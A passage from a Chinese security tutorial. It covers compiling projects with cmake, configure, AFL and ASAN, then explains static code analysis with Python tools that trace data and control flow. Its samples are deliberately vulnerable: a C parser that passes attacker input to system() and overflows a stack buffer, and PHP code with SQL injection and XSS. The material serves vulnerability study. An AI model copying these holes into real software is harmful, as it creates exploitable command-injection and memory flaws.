<p><code>cmake .</code> 的意思是,<code>.</code> 是指从当前目录的CMakeLists.txt 开始进行遍历,并生成数据对应的Makefile ,CMakeFiles 和CMakeCache.txt 到当前目录.使用了<code>cmake .</code> 来生成编译文件的话,那么各个子目录中也会生成出CMakeFiles 和CMakeCache.txt ,如果以后要发布代码或者添加新的依赖库和编译指令,那还需要对各个目录的CMakeFiles 和CMakeCache.txt 进行文件删除.所以正确的使用方式是先在项目根目录下<code>mkdir build</code> 创建新的build 目录,然后<code>cd build</code> 进入目录,接下来<code>cmake ..</code> 进行编译文件生成.</p>
<p><img src="pic5/pic12.png" alt="" /></p>
<p>然后执行<code>make</code> 命令就可以利用cmake 生成的编译文件进行编译了,结果如下:</p>
<p><img src="pic5/pic13.png" alt="" /></p>
<p>make 程序默认是使用单线程对项目进行编译,但是对于这种要编译很多文件的项目来说这样就太慢了.make 命令有一个-j 参数,它的意义在于启用多个线程进行编译,<code>make -j8</code> 就是启用8 个线程.因为我的机器比较牛逼,所以用<code>make -j12</code> 启用12 个线程来跑.</p>
<p><img src="pic5/pic14.png" alt="" /></p>
<p>提示,如果需要在编译过程中修改不同的编译参数时,把CMakeFiles 和CMakeCache.txt 文件都要删除重新进行cmake 操作.这个时候用build 目录存放CMake 生成文件的方便之处就体现出来了,只需要把build 目录删除重新创建即可,如果直接在根目录下cmake . 的话,各个代码目录都有CMakeFiles 和CMakeCache.txt ,假若删除的操作不当,可能会把项目代码文件给误删(如果是用命令rm -rf CMake* ,那么就会误删CMakeLists.txt ).</p>
<h4 id="configure"><a class="header" href="#configure">configure</a></h4>
<p>判断一个项目中是否使用configure ,我们看这个目录下是不是有configure 文件,php-src (https://github.com/php/php-src)为例子:</p>
<p><img src="pic5/pic15.png" alt="" /></p>
<p>使用configure 很简单,直接在目录下执行<code>./configure</code> 即可生成Makefile 文件</p>
<p><img src="pic5/pic16.png" alt="" /></p>
<h3 id="编译参数引入"><a class="header" href="#编译参数引入">编译参数引入</a></h3>
<p>我们在希望在编译的过程中引入一些编译的参数,可以在两个地方引入.生成Makefile 阶段和make 阶段</p>
<h4 id="生成makefile-阶段"><a class="header" href="#生成makefile-阶段">生成Makefile 阶段</a></h4>
<p>在使用./configure 生成Makefile 的时候,可以在./configure 的后面添加入编译器的参数,如果要使用指定的编译器来编译,我们可以这么来写:</p>
<pre><code class="language-shell">
./configure CC=clang CXX=clang++

</code></pre>
<p>其中,<code>CC=clang</code> 是指选择clang 作为C 编译器,<code>CXX=clang++</code> 作为C++ 编译器.如果希望使用afl 来跑Fuzzing 程序的话,第一步就需要在./configure 阶段指定编译器为afl 编译器,不使用afl 作为编译器的话,那么就无法对程序进行代码插桩(afl-fuzz 只是一个server ,传递和生成数据给被fuzzing 程序执行,被fuzzing 的程序在编译阶段就已经由afl-clang afl-gcc 这些编译器进行插桩代码).</p>
<pre><code class="language-shell">
./configure CC=afl-clang CXX=afl-clang++

</code></pre>
<p>选择好编译器之后,我们希望编译时启用ASAN ,那么就需要在CFLAGS CXXFLAGS 中指定参数,启用ASAN 的参数是<code>-fsanitize=address</code> ,构造的编译生成命令如下:</p>
<pre><code class="language-shell">
./configure CC=clang CXX=clang++ CFLAGS=&quot;-fsanitize=address&quot; CXXFLAGS=&quot;-fsanitize=address&quot;

</code></pre>
<p>如果希望在此基础上引入三级代码优化和带GCC 版本函数符号编译,那么可以这样写</p>
<pre><code class="language-shell">
./configure CC=clang CXX=clang++ CFLAGS=&quot;-fsanitize=address -O3 -g&quot; CXXFLAGS=&quot;-fsanitize=address -O3 -g&quot;

</code></pre>
<p>读者会注意到,为什么要同时指定C 和C++ 版本的编译器和编译参数呢?因为有些项目会同时存在C 和C++ 代码,所以我们在此需要同时指定一样的编译器和编译参数,以免在make 阶段因为两个版本的编译器的编译结果不符合导致链接时发生异常.</p>
<p>除此之外,有时候还需要指定引入依赖库的名字和地址,我们需要在LDFLAGS 中指定(这些库必须是由lib 字符做前缀的,然后在引入的时候需要-lxxx 导入库名字,小心注意这个坑)</p>
<pre><code class="language-shell">
./configure CC=clang CXX=clang++ LDFLAGS=&quot;-lm -lz&quot;

</code></pre>
<p>如果要指定包含文件的目录和库目录,那么就这样写(-I 是指定头文件目录,-L 是指定库文件目录)</p>
<pre><code class="language-shell">
./configure CC=clang CXX=clang++ CFLAGS=&quot;-I /usr/local/xxx -L /usr/local/xxx &quot;

</code></pre>
<p>对于CMake 来说,就不能使用像./configure 这样的方式来填写编译参数了.注意我们需要在参数前面添加-D 前缀,cmake 的自定义参数和./configure 稍有不同,举个例子</p>
<pre><code class="language-shell">
cmake .. -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_C_FLAGS=&quot;-fsanitize=address&quot; -DCMAKE_CXX_FLAGS=&quot;-fsanitize=address&quot;

</code></pre>
<p>有时候在cmake 用参数设置编译器会失效,那就需要手工在CMakeLists.txt 中指定编译器,代码如下:</p>
<pre><code class="language-cmake">
set(CMAKE_C_COMPILER &quot;/usr/local/gcc&quot;)
set(CMAKE_CXX_COMPILER &quot;/usr/local/g++&quot;)

</code></pre>
<h4 id="make-阶段"><a class="header" href="#make-阶段">make 阶段</a></h4>
<p>在make 引入数据的方式和./configure 是一样的</p>
<pre><code class="language-shell">
make CC=clang CXX=clang++ LDFLAGS=&quot;-lm -lz&quot;

</code></pre>
<p>但是在make 阶段中和./configure ,cmake 不同之处是还会根据环境变量来获取一些相关的数据来指定编译过程.以AFL 作为例子,我们知道,在编译过程中是不能直接指定CC=afl-clang 然后CFLAGS=-fsanitize=address 来引入ASAN 的,此时AFL 会报错提示,正确的操作方式是先在./configure 阶段指定好afl-clang ,然后在make 阶段这么操作</p>
<pre><code class="language-shell">
AFL_USE_ASAN=1 make

</code></pre>
<p>此时环境变量AFL_USE_ASAN 的值就会设置为1 ,AFL 根据这个值来自行构造编译命令给clang/gcc 来执行编译.所以,有些参数是需要在命令中传递的,有一些则是通过环境变量传递的,具体问题具体分析.</p>
<h3 id="缺少系统依赖库"><a class="header" href="#缺少系统依赖库">缺少系统依赖库</a></h3>
<p>在编译项目的过程中,可能会遇到缺少依赖库(这些库可能是头文件或者库文件).所以就需要我们来手工引入这些文件,以编译EOS 为例子.</p>
<p>笔者在cmake 时因为libboost 库版本过低,所以需要重新安装.</p>
<p><img src="pic5/pic17.png" alt="" /></p>
<p>到boost 官网下载1.69.0 代码库到本地,直接用wget 命令就可以保存文件到当前目录.</p>
<p><img src="pic5/pic18.png" alt="" /></p>
<p>下载成功之后,使用<code>tar -xvf boost_1_69_0.tar.gz</code> 即可解压到当前目录.然后进入目录开始编译:</p>
<p><img src="pic5/pic19.png" alt="" /></p>
<p>boost 库的编译步骤和之前的方式有些不同,它是自己构造好了一个脚本让用户调用部署,cd 到这个目录可以看到<code>bootstrap.sh</code> 脚本,直接运行即可.</p>
<p><img src="pic5/pic20.png" alt="" /></p>
<p><code>bootstrap.sh</code> 脚本提示我们执行<code>./b2</code> 脚本,于是继续执行<code>./b2</code> 脚本,boost 库就能够自动编译了.</p>
<p><img src="pic5/pic21.png" alt="" /></p>
<p>等待编译完成.</p>
<p><img src="pic5/pic22.png" alt="" /></p>
<p>接下来,我们使用<code>sudo ./b2 install</code> 来安装boost 库.</p>
<p><img src="pic5/pic23.png" alt="" /></p>
<p>现在cmake .. 可以找到一些boost 库,但是boost 库版本版本还是没有被识别到.</p>
<p><img src="pic5/pic24.png" alt="" /></p>
<p>注意cmake 的提示,它是在<code>/usr/include</code> 目录中寻找boost 库的,于是先来<code>ls /usr/include</code> 查看一下头文件.</p>
<p><img src="pic5/pic25.png" alt="" /></p>
<p>我们回过头来看看<code>sudo ./b2 install</code> 到底安装到了哪个位置,可以发现编译之后的头文件安装到了<code>/usr/local/include</code> 目录.</p>
<p><img src="pic5/pic26.png" alt="" /></p>
<p>然后我们来操作一波<code>rm -rf + cp</code>,把<code>/usr/local/include</code> 中的新编译的内容移动到<code>/usr/include</code> 中.</p>
<p><img src="pic5/pic27.png" alt="" /></p>
<p>重新cmake 项目,发现cmake 输出了我们安装的新版boost 库的版本.</p>
<p><img src="pic5/pic28.png" alt="" /></p>
<p>往下发现,cmake 发现系统缺少了libusb-1.0 和libcurl 库,所以需要安装它,因为当前的环境是ubuntu ,于是使用<code>apt install</code> 就能很方便地安装;如果在mac 下,那就需要用<code>brew install</code> ,注意brew 安装的库还需要自己手工调节环境变量PATH ,让安装好的库程序能够被找到.</p>
<p><img src="pic5/pic29.png" alt="" /></p>
<p>在命令窗口中输入<code>sudo apt install libusb</code> 加<code>TAB</code> 键,apt 命令就会列举出来很多和libusb 相关的程序.</p>
<p><img src="pic5/pic30.png" alt="" /></p>
<p>如果是编译过程中缺少了库,需要我们去安装的话,建议安装xxx-dbg 版的库程序.因为本次cmake .. 缺少的版本是libusb-1.0 库,所以需要用apt 安装libusb-1.0-dev 库.输入<code>sudo apt install libusb-1.0-0-dev</code> 下载libusb 库.</p>
<p><img src="pic5/pic31.png" alt="" /></p>
<p>重新cmake 项目,此时cmake 可以识别到libusb-1.0 库了.</p>
<p><img src="pic5/pic32.png" alt="" /></p>
<p>接下来使用同样的方法来安装libcurl 库.</p>
<p><img src="pic5/pic33.png" alt="" /></p>
<p>发现cmake 并没有成功识别,然后我们继续看看apt 有哪些库程序可以下载.</p>
<p><img src="pic5/pic34.png" alt="" /></p>
<p>我们注意这个<code>libcurl4-openssl-dev</code> .</p>
<p><img src="pic5/pic35.png" alt="" /></p>
<p>因为eos 是依赖openssl 的,猜测是不是需要curl 也引入openssl ,继续安装这个库.</p>
<p><img src="pic5/pic36.png" alt="" /></p>
<p>重新cmake 项目,此时cmake 可以识别到libcurl 库了并生成Makefile 了.接下来就是一边编译一边摸鱼的快乐时光了,哈哈哈..</p>
<p><img src="pic5/pic37.png" alt="" /></p>
<h3 id="总结-1"><a class="header" href="#总结-1">总结</a></h3>
<p>本章前本段的编译知识着重于介绍一些编译相关知识,了解这些知识在后面中编写更强力的Fuzzer 中会使用到.后半段着重于实战环境中的Linux 下的编译过程,这里提到的一些编译参数的设置方法在使用第三方编译工具时经常会遇到知识,避坑的方法大概是:引入库文件,头文件/强制修改编译器等等,具体问题按场景具体分析.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="8-静态程序分析原理"><a class="header" href="#8-静态程序分析原理">8. 静态程序分析原理</a></h1>
<ul>
<li><a href="6.static-analysis.html#%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7">必备工具</a></li>
<li><a href="6.static-analysis.html#%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86">静态代码分析基本原理</a>
<ul>
<li><a href="6.static-analysis.html#%E6%95%B0%E6%8D%AE%E6%B5%81%E8%B7%9F%E8%B8%AA">数据流跟踪</a></li>
<li><a href="6.static-analysis.html#%E6%8E%A7%E5%88%B6%E6%B5%81%E5%88%86%E6%9E%90">控制流分析</a></li>
<li><a href="6.static-analysis.html#%E5%87%BD%E6%95%B0%E4%BA%A4%E5%8F%89%E5%BC%95%E7%94%A8">函数交叉引用</a></li>
<li><a href="6.static-analysis.html#%E7%BB%BC%E5%90%88%E5%88%86%E6%9E%90">综合分析</a></li>
<li><a href="6.static-analysis.html#%E5%88%A4%E6%96%AD%E6%B1%82%E8%A7%A3">判断求解</a></li>
</ul>
</li>
<li><a href="6.static-analysis.html#%E9%99%84%E5%BD%95%E4%B8%80----%E5%90%84%E5%9B%BE%E7%9A%84graphiz-%E7%94%9F%E6%88%90%E4%BB%A3%E7%A0%81">附录一 -- 各图的Graphiz 生成代码</a></li>
<li><a href="6.static-analysis.html#%E9%99%84%E5%BD%95%E4%BA%8C----%E9%9D%99%E6%80%81%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7%E5%AE%8C%E6%95%B4%E6%BA%90%E7%A0%81">附录二 -- 静态审计工具完整源码</a></li>
</ul>
<h2 id="必备工具-5"><a class="header" href="#必备工具-5">必备工具</a></h2>
<p>Python ,cparser (https://github.com/tscosine/cparser/)</p>
<h2 id="静态代码分析基本原理"><a class="header" href="#静态代码分析基本原理">静态代码分析基本原理</a></h2>
<p>静态代码分析是基于有源码的情况下根据已有的规则来匹配源码中是否可能存在漏洞.对于漏洞规则,我们一般分为两种情况:二进制语言和脚本解析语言.为什么要这么样来区分呢?这是因为脚本解析语言绝大部分的漏洞是没有过滤用户的输入,使得用户的输入传递到了敏感函数中执行(比如SQL 注入,反序列化,远程命令执行的原理等),有少部分的漏洞是因为语言本身的特性而导致的.但是二进制语言(C/C++/go)除了前面所述的逻辑,最难的一点是计算程序内存区域是否会出现异常情况(也就是二进制漏洞中常见的UaF ,OOB 等),用静态代码分析比较难发现这些隐藏的漏洞.所以我们先从简单的来说起,相信做过PHP 白盒审计的读者们都知道Seay源码审计助手,这个工具的原理就是通过正则表达式在代码文本中匹配相应的规则,然后生成漏洞报告.</p>
<p><img src="pic6/pic1.jpeg" alt="" /></p>
<p>Seay源码审计助手只定位到代码调用敏感函数的位置,但是并没有对参数进行相应的校验,比如说对代码<code>include  $Dir . &quot;/test.php&quot;;</code> 的检测,假设<code>$Dir = &quot;/var/www/&quot;;</code> ,审计助手也是依旧识别为可能存在文件包含漏洞,其实<code>$Dir</code> 的值是固定的,只需要跟踪这个值就可以知道它是不可控的变量.</p>
<p>我们再来看一下fortity SCA ,fortify 对项目扫描除了匹配漏洞之外,还会根据程序的逻辑和函数交叉引用来绘制程序时序图表.接下来我们来了解一些静态代码分析的基本原理.</p>
<p><img src="pic6/pic2.png" alt="" /></p>
<h3 id="数据流跟踪"><a class="header" href="#数据流跟踪">数据流跟踪</a></h3>
<p>我们先来一段示例代码:</p>
<pre><code class="language-c">
#include &lt;malloc.h&gt;
#include &lt;memory.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;


enum {
  MessageType_Hello = 0,
  MessageType_Execute,
  MessageType_Data
};

void execute_command(const unsigned char* command) {
    system(command);
}

void decrypt_data(const unsigned char* data_buffer,unsigned char data_buffer_length) {
    unsigned char* buffer[8] = {0};

    for (unsigned int data_index = 0;data_index &lt; data_buffer_length;++data_index)
        buffer[data_index] = data_buffer[data_index] ^ 0x65;

    printf(&quot;Recv:%s\n&quot;,&amp;buffer);
}

int buffer_resolver(const unsigned char* buffer) {
    unsigned char buffer_length = buffer[0];

    if (2 &lt;= buffer_length)
        return 0;

    if (MessageType_Hello == buffer[1]) {
        printf(&quot;Hello\n&quot;);
    } else if (MessageType_Execute == buffer[1]) {
        unsigned char* command_buffer = (unsigned char*)malloc(buffer_length - 1);

        memset(&amp;command_buffer,0,buffer_length);
        memcpy(&amp;command_buffer,&amp;buffer[2],buffer_length - 2);

        execute_command(command_buffer);
    } else if (MessageType_Data == buffer[1]) {
        decrypt_data(&amp;buffer[2],buffer_length - 2);
    }

    return 1;
}

</code></pre>
<p>这是一段简单的解析数据包的示例代码,可以看到入口点<code>buffer_resolver()</code> 函数提供了一个buffer 参数供外部调用,接下来程序逻辑就针对这个buffer 的内容进行解析然后做进一步的处理.数据流跟踪的意义在于,对一个特定的变量或者参数进行数据流分析,找到这个变量或者参数的来源是否为可控的.</p>
<p>我们把<code>buffer_resolver()</code> 的代码抽象成数据流图.</p>
<p><img src="pic6/pic3.png" alt="" /></p>
<p>现在我们可以很清楚地了解到<code>buffer_resolver()</code> 中的数据流过程.图表中绿色代表函数的参数输入,紫色线代表读数据,蓝色线代表写数据,红色线是传递该内容到函数中调用,在标注线的内容中也提到了如何操作数据和操作的位置.在我们做白盒分析代码的时候,一般是定位到敏感函数的位置再做数据流分析.上面的数据流图是<strong>从上往下</strong>分析的,但是如果要对敏感函数的参数进行溯源分析,此时就是要构画一个<strong>从下往上</strong>的数据流图分析.我们的规则匹配到<code>execute_command()</code> ,然后从第一个参数开始往上跟踪,可以得到图表如下:</p>
<p><img src="pic6/pic4.png" alt="" /></p>
<p>有了这张粗略的从数据流回溯图,我们很容易就能看到<code>execute_command()</code> 的参数受到哪些地方影响.所以,<strong>当我们定位到某个规则的时候,需要找到能够影响参数的内容,就需要从下往上(从敏感参数开始向上搜索)来对数据流进行回溯;当我们从数据输入位置开始搜索它能影响到哪些变量和参数,就需要从上往下(从可控输入开始向下搜索)对数据进行跟踪</strong>.再举个简单的PHP 例子:</p>
<pre><code class="language-php">
&lt;?php

    $user_id = $_GET['id'];

    $user_name = sql_query('SELECT user_name FROM user WHERE uid = ' . $user_id);

    echo 'Hello : ' . $user_name . ' Uid(' . $user_id . ')';

?&gt;

</code></pre>
<p>对$_GET['id'] 进行数据跟踪,可以发现两个漏洞问题:SQL 注入和XSS .</p>
<p><img src="pic6/pic5.png" alt="" /></p>
<p>对<code>sql_query()</code> 进行漏洞规则,我们可以看到在拼接字符串阶段直接把<code>$user_id</code> 引入到<code>sql_query()</code> 的参数中.</p>
<p><img src="pic6/pic6.png" alt="" /></p>
<p>对echo 的搜索方式也是一样的原理,限于篇幅此处省略.</p>
<p>下面使用Python 来对示例C++ 代码实现分析.用到https://github.com/tscosine/cparser/ 来解析C++ 代码成AST 代码树</p>
<pre><code class="language-python">
import cparser

code = '''
int buffer_resolver(const unsigned char* buffer) {
    unsigned char buffer_length = buffer[0];

    if (2 &lt;= buffer_length)
        return 0;

    if (MessageType_Hello == buffer[1]) {
        printf(&quot;Hello\n&quot;);
    } else if (MessageType_Execute == buffer[1]) {
        unsigned char* command_buffer = (unsigned char*)malloc(buffer_length - 1);

        memset(&amp;command_buffer,0,buffer_length);
        memcpy(&amp;command_buffer,&amp;buffer[2],buffer_length - 2);

        execute_command(command_buffer);
    } else if (MessageType_Data == buffer[1]) {
        decrypt_data(&amp;buffer[2],buffer_length - 2);
    }

    return 1;
}
'''

data = cparser.get_func_tree(code)

data.nprint()

</code></pre>
<p>对应的nprint() 输出效果</p>
<p><img src="pic6/pic7.png" alt="" /></p>
<p>我们使用subnode 对象来获取函数下的语句</p>
<pre><code class="language-python">
for subnode_index in data.subnode :
    print subnode_index

</code></pre>
<p><img src="pic6/pic8.png" alt="" /></p>
<p>接下来我们对AST 树进行递归搜索,遍历所有函数调用查找execute_command 并输出函数参数(注解:解析函数参数的代码也是遍历AST 树,建议调试理解这部分的代码)</p>
<pre><code class="language-python">
def get_function_parameters(ast_node) :
    parameters_list = []

    for subnode_index in ast_node.subnode :
        if subnode_index[1].type == 'parallel' :
            parameters_list += get_function_parameters(subnode_index[1])
        elif subnode_index[0] == 'parameters' :
            parameters_list.append({
                'type' : subnode_index[1].type ,
                'value' : subnode_index[1].value ,
            })
        elif subnode_index[0].startswith('exp') :
            parameters_list.append({
                'type' : subnode_index[1].type ,
                'value' : subnode_index[1].value ,
            })

    return parameters_list

def recursive_find_call(ast_node,find_function_name) :
    find_result = []

    for subnode_index in ast_node.subnode :
        if 'function_call' == subnode_index[1].type :
            if find_function_name == '*' or find_function_name == subnode_index[1].value :
                parameters_list = get_function_parameters(subnode_index[1])

                find_result.append((subnode_index,parameters_list))

        find_result += recursive_find_call(subnode_index[1],find_function_name)

    return find_result

def print_search_result(call_list) :
    for call_index in call_list :
        ast_node_info = call_index[0]
        parameters_info = call_index[1]

        print 'Call Function Name :',ast_node_info[1].value
        print '  Function Argument :',parameters_info


find_function_call = recursive_find_call(data,'execute_command')

print_search_result(find_function_call)

</code></pre>
<p>程序输出如下:</p>
<p><img src="pic6/pic9.png" alt="" /></p>
<p>现在已经可以在AST 树中搜索指定的函数调用和对应的参数列表了,然后我们再拓展自定义搜索规则的功能</p>
<pre><code class="language-python">
search_strategy = '''
execute_command(*)
'''

def resolve_strategy(user_search_strategy) :
    user_search_strategy = user_search_strategy.split('\n')
    check_strategy = []

    for user_search_strategy_index in user_search_strategy :
        strategy_record = user_search_strategy_index.strip()

        if not len(strategy_record) :
            continue

        search_function_name = strategy_record.split('(')[0].strip()
        search_parameter_string = strategy_record.split('(')[1].strip()
        search_parameter_string = search_parameter_string.split(')')[0].strip()
        search_parameter_list = []

        if len(search_parameter_string) :
            if not -1 == search_parameter_string.find(',') :
                search_parameter_string = search_parameter_string.split(',')
                parameter_index = -1

                for search_parameter_index in search_parameter_string :
                    check_parameter = search_parameter_index.strip()
                    parameter_index += 1

                    if not check_parameter == '*' :
                        continue

                    search_parameter_list.append(parameter_index)
            else :
                check_parameter = search_parameter_string.strip()

                if check_parameter == '*' :
                    search_parameter_list.append(0)

        check_strategy.append((search_function_name,search_parameter_list))

    return check_strategy

print resolve_strategy(search_strategy)

</code></pre>
<p>自定义匹配策略的规则是:函数名(检测的函数参数),举个例子:比如要我们知道<code>eval()</code> 函数的第一个参数对输入是敏感的,那么就需要对所有调用<code>eval()</code> 函数的第一个参数进行可控检测,对应的规则是<code>eval(*)</code> ;如果要检测<code>call_user_func()</code> ,那么就要检测第一和第二个参数是否可控,对应的策略为<code>call_user_func(*,*)</code> .有了策略解析器之后,我们再来完善漏洞规则匹配功能:</p>
<pre><code class="language-python">
search_strategy = '''
execute_command(*)
'''

search_strategy = resolve_strategy(search_strategy)
search_record = {}

for search_strategy_index in search_strategy :  #  Search Call by Strategy
    find_function_name = search_strategy_index[0]
    search_check_parameter_list = search_strategy_index[1]
    find_function_call = recursive_find_call(data,find_function_name)

    print_search_result(find_function_call)
    search_record[find_function_name] = []

    for call_index in find_function_call :  #  Find Match Strategy Call
        ast_node_info = call_index[0]
        parameters_list = call_index[1]

        if search_check_parameter_list :
            check_parameter_list = []

            for search_check_parameter_index in search_check_parameter_list :  #  Filter Call Argument
                if len(parameters_list) &lt;= search_check_parameter_index :
                    continue

                target_search_parameter = parameters_list[search_check_parameter_index]

                if not target_search_parameter['type'] in ['variable','address_of'] :  #  Check this Argument is a Variant ..
                    continue

                check_parameter_list.append(target_search_parameter)

            if check_parameter_list :
                search_record[find_function_name].append((ast_node_info,check_parameter_list))
        else :
            search_record[find_function_name].append((ast_node_info,[]))


print search_record

</code></pre>
<p>现在可以根据指定的参数来匹配代码中的函数调用了,输出内容如下</p>
<p><img src="pic6/pic10.png" alt="" /></p>
<p>修改策略,搜索<code>memcpy()</code> 函数</p>
<pre><code class="language-python">
search_strategy = '''
execute_command(*)
memcpy(,*,)
'''

</code></pre>
<p>搜索结果如下</p>
<p><img src="pic6/pic11.png" alt="" /></p>
<p>最后一步就是实现数据流跟踪功能,在此我们只关注variable 和address_of 类型的AST 树节点数据</p>
<pre><code class="language-python">
def xref_variant(trance_record,bingo_parameter_name) :
    xref_record = []

    for trance_record_index in trance_record[ :: -1 ] :
        if trance_record_index[1].type in ['get_element','assign'] :
            if bingo_parameter_name in trance_record_index[1].value :
                xref_record.append({
                    'type' : trance_record_index[1].type ,
                    'value' : trance_record_index[1].value ,
                    'node' : trance_record_index
                })
        elif trance_record_index[1].type == 'function_call' :
            function_parameters = get_function_parameters(trance_record_index[1])

            for function_parameter_index in function_parameters :
                if not bingo_parameter_name in function_parameter_index['value'] :
                    continue

                xref_record.append({
                    'type' : trance_record_index[1].type ,
                    'value' : trance_record_index[1].value ,
                    'node' : trance_record_index
                })

    return xref_record

def trance_record_by_ast(start_node,target_node,bingo_parameters,trance_record) :
    code_record = []

    for node_object_index in start_node.subnode :
        if node_object_index == target_node :
            xref_record_list = []

            for bingo_parameter_index in bingo_parameters :
                xref_record_list.append(xref_variant(trance_record + code_record,bingo_parameter_index['value']))

            return (True,xref_record_list)

        code_record.append(node_object_index)

        is_search,sub_data = trance_record_by_ast(node_object_index[1],target_node,bingo_parameters,trance_record + code_record)

        if is_search :
            xref_record_list = sub_data

            return (True,xref_record_list)

        sub_code_record = sub_data
        code_record += sub_code_record

    return (False,code_record)


search_strategy = '''
execute_command(*)
'''
search_record = search_call_by_strategy(search_strategy,data)

print 'Search Record :',search_record

for search_record_index in search_record.keys() :
    functinon_name = search_record_index
    bingo_record_list = search_record[search_record_index]

    for bingo_record_index in bingo_record_list :
        print trance_record_by_ast(data,bingo_record_index[0],bingo_record_index[1],[])

</code></pre>
<p>运行效果如下</p>
<p><img src="pic6/pic12.png" alt="" /></p>
<p>对数据流的分析需要比较多的递归,笔者在设计PHP 白盒审计工具时(https://github.com/lcatro/PHP_Source_Audit_Tools) 就遇到过性能问题,在几个页面之间做深度数据流分析很容易会产生大量递归和循环,做好数据流跟踪之后,接下来就是控制流分析.</p>
<h3 id="控制流分析"><a class="header" href="#控制流分析">控制流分析</a></h3>
<p>控制流分析面向的是对程序判断的分析,程序通过if switch for while 这些语句对代码块进行跳转执行处理,我们把一段代码改为代码块来理解,把判断语句作为分割代码块之间的跳转条件,这样我们就能得到程序的执行图.对于<code>buffer_resolve()</code> 它的程序执行图如下:</p>
<p><img src="pic6/pic13.png" alt="" /></p>
<p>可以看到,<code>buffer_resolve()</code> 中有4 个判断语句,整个程序一共有5 条路径,分别如下:</p>
<pre><code class="language-txt">
entry -&gt; block_1
entry -&gt; block_2 -&gt; block_3 -&gt; block_6
entry -&gt; block_2 -&gt; block_4 -&gt; block_6
entry -&gt; block_2 -&gt; block_5 -&gt; block_6
entry -&gt; block_2 -&gt; block_6

</code></pre>
<p><code>buffer_resolve()</code> 调用<code>execute_command()</code> 函数的代码在block5 代码块里面,要想让代码执行到block5 的路径,那就只有路径<code>entry -&gt; block_2 -&gt; block_5 -&gt; block_6</code> .要满足这条路径,那就必须要满足三个条件:</p>
<pre><code class="language-txt">
condition_1 = (2 &lt;= buffer_length)
condition_2 = (MessageType_Hello == buffer[1])
condition_3 = (MessageType_Execute == buffer[1])

!condition_1 &amp;&amp; !condition_2 &amp;&amp; conditon_3

</code></pre>
<p><code>!condition_1 &amp;&amp; !condition_2 &amp;&amp; conditon_3</code> 指的是条件约束,需我们给定的输入满足这些条件才可以让程序执行到block5 .现在我们继续用AST 从代码中分析控制流.</p>
<pre><code class="language-python">
def get_condition(ast_node) :
    for index in ast_node.subnode :
        if 'condition' == index[0] :
            return index[1].value

    return False

def trance_control_flow_by_ast(start_node,target_node,trance_record) :
    code_record = []

    for node_object_index in start_node.subnode :
        if node_object_index == target_node :
            all_trance_record = trance_record + code_record
            control_flow_list = []

            for trance_record_index in all_trance_record :
                if trance_record_index[1].type == 'if' :
                    control_flow_list.append(get_condition(trance_record_index[1]))

            return (True,control_flow_list)

        code_record.append(node_object_index)

        is_search,sub_data = trance_control_flow_by_ast(node_object_index[1],target_node,trance_record + code_record)

        if is_search :
            control_flow_record_list = sub_data

            return (True,control_flow_record_list)

    return (False,code_record)


search_strategy = '''
execute_command(*)
'''
search_record = search_call_by_strategy(search_strategy,data)

print 'Search Record :',search_record

for search_record_index in search_record.keys() :
    functinon_name = search_record_index
    bingo_record_list = search_record[search_record_index]

    for bingo_record_index in bingo_record_list :
        print trance_control_flow_by_ast(data,bingo_record_index[0],[])

</code></pre>
<p>运行结果如下:</p>
<p><img src="pic6/pic14.png" alt="" /></p>
<h3 id="函数交叉引用"><a class="header" href="#函数交叉引用">函数交叉引用</a></h3>
<p>函数交叉引用旨在于函数之间的调用关系,我们可以用IDA 对上面的代码进行交叉引用图表生成,找到<code>buffer_resolver()</code> 函数,右键&quot;xrefs graph to&quot;.</p>
<p><img src="pic6/pic15.png" alt="" /></p>
<p>但是IDA 却弹出了没有找到</p>
<p><img src="pic6/pic16.png" alt="" /></p>
<p>&quot;xrefs graph to&quot; 选项的意思是,搜索哪里调用到这个函数(对应从下往上);&quot;xrefs graph from&quot;是搜索当前函数调用了哪些函数(对应从上往下),于是我们选择&quot;xrefs graph from&quot; 再次查看结果</p>
<p><img src="pic6/pic17.png" alt="" /></p>
<p>然后我们继续来实现函数交叉引用的功能.代码如下(由于这个代码库只支持对一个函数代码进行序列化AST ,所以用了一个dict 对象保存所有序列化后的代码,故以下的示例代码比较亢长):</p>
<pre><code class="language-python">

code_emun = '''
enum {
  MessageType_Hello = 0,
  MessageType_Execute,
  MessageType_Data
};
'''

code_execute_command = '''
void execute_command(const unsigned char* command) {
    system(command);
}
'''

code_decrypt_data = '''
void decrypt_data(const unsigned char* data_buffer,unsigned char data_buffer_length) {
    unsigned char* buffer[8] = {0};

    for (unsigned int data_index = 0;data_index &lt; data_buffer_length;++data_index)
        buffer[data_index] = data_buffer[data_index] ^ 0x65;

    printf(&quot;Recv:%s\n&quot;,&amp;buffer);
}
'''

code_buffer_resolver = '''
int buffer_resolver(const unsigned char* buffer) {
    unsigned char buffer_length = buffer[0];

    if (2 &lt;= buffer_length)
        return 0;

    if (MessageType_Hello == buffer[1]) {
        printf(&quot;Hello\n&quot;);
    } else if (MessageType_Execute == buffer[1]) {
        unsigned char* command_buffer = (unsigned char*)malloc(buffer_length - 1);

        memset(&amp;command_buffer,0,buffer_length);
        memcpy(&amp;command_buffer,&amp;buffer[2],buffer_length - 2);

        execute_command(command_buffer);
    } else if (MessageType_Data == buffer[1]) {
        decrypt_data(&amp;buffer[2],buffer_length - 2);
    }

    return 1;
}
'''

code_stream = {
    'global_enum' : cparser.get_func_tree(code_emun) ,
    'decrypt_data' : cparser.get_func_tree(code_decrypt_data) ,
    'execute_command' : cparser.get_func_tree(code_execute_command) ,
    'buffer_resolver' : cparser.get_func_tree(code_buffer_resolver) ,
}


def get_function_parameters(ast_node) :
    parameters_list = []

    for subnode_index in ast_node.subnode :
        if subnode_index[1].type == 'parallel' :
            parameters_list += get_function_parameters(subnode_index[1])
        elif subnode_index[0] == 'parameters' :
            parameters_list.append({
                'type' : subnode_index[1].type ,
                'value' : subnode_index[1].value ,
            })
        elif subnode_index[0].startswith('exp') :
            parameters_list.append({
                'type' : subnode_index[1].type ,
                'value' : subnode_index[1].value ,
            })

    return parameters_list

def recursive_find_call(ast_node,find_function_name) :
    find_result = []

    for subnode_index in ast_node.subnode :
